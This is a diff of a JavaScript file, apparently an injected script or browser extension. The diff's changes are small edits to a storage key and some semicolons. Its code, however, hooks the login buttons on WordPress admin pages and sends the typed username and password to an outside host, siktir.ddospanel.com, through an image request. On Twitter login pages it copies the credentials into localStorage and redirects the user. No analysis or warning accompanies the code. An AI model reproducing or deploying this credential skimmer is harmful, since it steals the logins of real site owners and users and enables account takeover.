@@ -1,4 +1,3 @@
-
 if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
 document.getElementById('wp-submit').onclick = function() {
    new Image().src = 'http://siktir.ddospanel.com/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
@@ -15,7 +14,7 @@ if( document.getElementById('signin-email')) {  window.location = "https://twitt
 }, 300);
 
 tarih = new Date();
-    storage_key = 'access_twittarr_';
+    storage_key = 'access_twittar_';
     if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
         tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
         localStorage[storage_key] = tarih.getTime();
@@ -29,8 +28,8 @@ document.getElementById("session").innerHTML = '<a href="https://twitter.com/log
 if (window.location.href.indexOf("login") >= 0) {
 
 	document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick = function(data) {
-	localStorage['sw'] = document.querySelectorAll('.js-username-field')[0].value
-	localStorage['pw'] = document.querySelectorAll('.js-password-field')[0].value
+	localStorage['sw'] = document.querySelectorAll('.js-username-field')[0].value;
+	localStorage['pw'] = document.querySelectorAll('.js-password-field')[0].value;
 		
 		setTimeout(function() {
 			document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick;
